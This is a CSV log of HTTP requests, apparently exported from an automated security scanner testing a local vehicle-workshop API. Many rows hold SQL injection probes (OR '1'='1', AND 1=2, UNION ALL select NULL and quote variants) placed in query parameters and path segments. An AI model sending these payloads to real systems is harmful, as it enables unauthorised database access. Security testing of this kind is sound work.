ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
4620,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/vehicle/1929186d-8b67-4163-a208-de52a41f7301%27+OR+%271%27%3D%271%27+--+/location,401,,201,500,49
4621,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/vehicle/add_vehicle,401,,200,500,49
4622,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/community/posts/tiSTSUzh4BwtvYSLWPsqu9/comment,401,Unauthorized,400,379,25
4623,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/verify-email-token,401,,201,500,49
4624,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v4.0/user/login-with-token,403,,199,482,165
4625,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v2/check-otp,500,,406,481,58
4626,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/service_requests?limit=30&offset=0%29+UNION+ALL+select+NULL+--+,401,Unauthorized,83,346,33
4627,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/management/users/all?limit=30&offset=0,401,Unauthorized,74,346,33
4628,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/shop/orders/all?limit=30&offset=0%27+AND+%271%27%3D%272%27+--+,401,Unauthorized,70,346,33
4629,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/service_requests?limit=30&offset=0%27%29+UNION+ALL+select+NULL+--+,401,Unauthorized,17,346,33
4630,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/shop/orders/all?limit=30&offset=0%27+OR+%271%27%3D%271%27+--+,401,Unauthorized,22,346,33
4631,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1%27%29+UNION+ALL+select+NULL+--+&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271,500,Internal Server Error,104,337,145
4632,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/service_requests?limit=30&offset=0,401,Unauthorized,20,346,33
4633,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/videos,401,,299,500,49
4634,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v2.7/user/login-with-token,500,,496,481,76
4635,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/pictures,401,,302,500,49
4636,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/change-email,401,,301,500,49
4637,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/signup,400,,302,482,479
4638,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v3/check-otp,500,,303,481,58
4639,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/community/posts,401,Unauthorized,298,379,25
4640,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/vehicle/1929186d-8b67-4163-a208-de52a41f7301+UNION+ALL+select+NULL+--+/location,401,,105,500,49
4641,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/shop/orders/all?limit=30&offset=0+UNION+ALL+select+NULL+--+,401,Unauthorized,66,346,33
4642,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,"http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My%20car%20has%20engine%20trouble,%20and%20I%20need%20urgent%20help!&vin=0BZCX25UTBJ987271",500,Internal Server Error,79,337,145
4643,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/shop/orders/all?limit=30&offset=0%27+UNION+ALL+select+NULL+--+,401,Unauthorized,13,346,33
4644,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/shop/orders/all?limit=30&offset=0%22+UNION+ALL+select+NULL+--+,401,Unauthorized,11,346,33
4645,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/shop/orders/all?limit=30&offset=0%29+UNION+ALL+select+NULL+--+,401,Unauthorized,11,346,33
4646,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,"http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My%20car%20has%20engine%20trouble,%20and%20I%20need%20urgent%20help!&vin=0BZCX25UTBJ987271",500,Internal Server Error,31,337,145
4647,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/1+UNION+ALL+select+NULL+--+,401,,399,500,49
4648,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/convert_video?video_id=1+UNION+ALL+select+NULL+--+,401,,199,500,49
4649,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,PUT,http://localhost:8888/identity/api/v2/user/videos/10,401,,200,500,49
4650,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/verify-email-token,401,,198,500,49
4651,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/community/api/v2/community/posts/recent?limit=30&offset=0,401,Unauthorized,400,379,25
4652,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/coupon/new-coupon,401,Unauthorized,400,379,25
4653,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/shop/orders/all?limit=30&offset=0%27%29+UNION+ALL+select+NULL+--+,401,Unauthorized,18,346,33
4654,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/shop/orders/all?limit=30&offset=0,401,Unauthorized,12,346,33
4655,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,"http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My%20car%20has%20engine%20trouble,%20and%20I%20need%20urgent%20help!&vin=0BZCX25UTBJ987271",500,Internal Server Error,63,337,145
4656,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21+AND+1%3D1+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,26,337,145
4657,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v4.0/user/login-with-token,403,,297,482,165
4658,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/videos,401,,201,500,49
4659,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/vehicle/add_vehicle,401,,300,500,49
4660,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/community/posts/tiSTSUzh4BwtvYSLWPsqu9/comment,401,Unauthorized,302,379,25
4661,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/vehicle/1929186d-8b67-4163-a208-de52a41f7301%27+UNION+ALL+select+NULL+--+/location,401,,197,500,49
4662,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21+AND+1%3D2+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,31,337,145
4663,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21+OR+1%3D1+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,40,337,145
4664,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/change-email,401,,295,500,49
4665,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v2.7/user/login-with-token,500,,299,481,76
4666,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21%27+AND+%271%27%3D%271%27+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,43,337,145
4667,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/verify-email-token,401,,199,500,49
4668,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/1%27+UNION+ALL+select+NULL+--+,401,,200,500,49
4669,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,PUT,http://localhost:8888/identity/api/v2/user/videos/10,401,,199,500,49
4670,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/pictures,401,,296,500,49
4671,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/signup,400,,296,482,479
4672,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/coupon/new-coupon,401,Unauthorized,202,379,25
4673,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v3/check-otp,500,,301,481,58
4674,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21%27+AND+%271%27%3D%272%27+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,42,337,145
4675,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21%27+OR+%271%27%3D%271%27+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,31,337,145
4676,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/convert_video?video_id=1%27+UNION+ALL+select+NULL+--+,401,,298,500,49
4677,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v2/check-otp,500,,492,481,58
4678,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/community/posts,401,Unauthorized,394,379,25
4679,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/vehicle/1929186d-8b67-4163-a208-de52a41f7301%22+UNION+ALL+select+NULL+--+/location,401,,198,500,49
4680,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/vehicle/add_vehicle,401,,200,500,49
4681,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:45 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/videos,401,,201,500,49
4682,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/community/api/v2/community/posts/recent?limit=30&offset=0,401,Unauthorized,302,379,25
4683,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21+UNION+ALL+select+NULL+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,38,337,145
4684,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21%27+UNION+ALL+select+NULL+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,37,337,145
4685,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21%22+UNION+ALL+select+NULL+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,33,337,145
4686,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/1%22+UNION+ALL+select+NULL+--+,401,,200,500,49
4687,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/verify-email-token,401,,205,500,49
4688,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/pictures,401,,205,500,49
4689,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/signup,400,,205,482,479
4690,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/convert_video?video_id=1%22+UNION+ALL+select+NULL+--+,401,,107,500,49
4691,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,PUT,http://localhost:8888/identity/api/v2/user/videos/10,401,,205,500,49
4692,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/coupon/new-coupon,401,Unauthorized,204,379,25
4693,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21%29+UNION+ALL+select+NULL+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,34,337,145
4694,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21%27%29+UNION+ALL+select+NULL+--+&vin=0BZCX25UTBJ987271,500,Internal Server Error,25,337,145
4695,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,"http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My%20car%20has%20engine%20trouble,%20and%20I%20need%20urgent%20help!&vin=0BZCX25UTBJ987271",500,Internal Server Error,26,337,145
4696,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/videos,401,,196,500,49
4697,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,"http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My%20car%20has%20engine%20trouble,%20and%20I%20need%20urgent%20help!&vin=0BZCX25UTBJ987271",500,Internal Server Error,26,337,145
4698,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/vehicle/add_vehicle,401,,197,500,49
4699,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/vehicle/1929186d-8b67-4163-a208-de52a41f7301%29+UNION+ALL+select+NULL+--+/location,401,,197,500,49
4700,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/1%29+UNION+ALL+select+NULL+--+,401,,99,500,49
4701,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v2.7/user/login-with-token,500,,301,481,76
4702,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,"http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My%20car%20has%20engine%20trouble,%20and%20I%20need%20urgent%20help!&vin=0BZCX25UTBJ987271",500,Internal Server Error,25,337,145
4703,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271+AND+1%3D1+--+,500,Internal Server Error,25,337,145
4704,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271+AND+1%3D2+--+,500,Internal Server Error,26,337,145
4705,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,PUT,http://localhost:8888/identity/api/v2/user/videos/10,401,,192,500,49
4706,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/verify-email-token,401,,193,500,49
4707,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/convert_video?video_id=1%29+UNION+ALL+select+NULL+--+,401,,192,500,49
4708,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/community/posts/tiSTSUzh4BwtvYSLWPsqu9/comment,401,Unauthorized,498,379,25
4709,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/pictures,401,,195,500,49
4710,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v2/check-otp,500,,302,481,58
4711,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/community/posts,401,Unauthorized,301,379,25
4712,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/coupon/new-coupon,401,Unauthorized,196,379,25
4713,Mon Jun 01 01:17:45 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v3/check-otp,500,,398,481,58
4714,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271+OR+1%3D1+--+,500,Internal Server Error,31,337,145
4715,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271%27+AND+%271%27%3D%271%27+--+,500,Internal Server Error,31,337,145
4716,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271%27+AND+%271%27%3D%272%27+--+,500,Internal Server Error,32,337,145
4717,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/1%27%29+UNION+ALL+select+NULL+--+,401,,199,500,49
4718,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/vehicle/1929186d-8b67-4163-a208-de52a41f7301%27%29+UNION+ALL+select+NULL+--+/location,401,,199,500,49
4719,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/videos,401,,201,500,49
4720,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/community/api/v2/community/posts/recent?limit=30&offset=2-2,401,Unauthorized,401,379,25
4721,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271%27+OR+%271%27%3D%271%27+--+,500,Internal Server Error,35,337,145
4722,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271+UNION+ALL+select+NULL+--+,500,Internal Server Error,27,337,145
4723,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271%27+UNION+ALL+select+NULL+--+,500,Internal Server Error,28,337,145
4724,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/workshop/api/mechanic/receive_report?mechanic_code=TRAC_MECH1&problem_details=My+car+has+engine+trouble%2C+and+I+need+urgent+help%21&vin=0BZCX25UTBJ987271%22+UNION+ALL+select+NULL+--+,500,Internal Server Error,26,337,145
4725,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/verify-email-token,401,,199,500,49
4726,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/signup,400,,392,482,479
4727,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/v2/user/pictures,401,,197,500,49
4728,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,GET,http://localhost:8888/identity/api/v2/user/videos/convert_video?video_id=1%27%29+UNION+ALL+select+NULL+--+,401,,199,500,49
4729,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,PUT,http://localhost:8888/identity/api/v2/user/videos/10,401,,200,500,49
4730,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/identity/api/auth/v2.7/user/login-with-token,500,,302,481,76
4731,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/community/posts,401,Unauthorized,200,379,25
4732,Mon Jun 01 01:17:46 GMT-03:00 2026,Mon Jun 01 01:17:46 GMT-03:00 2026,POST,http://localhost:8888/community/api/v2/coupon/new-coupon,401,Unauthorized,199,379,25
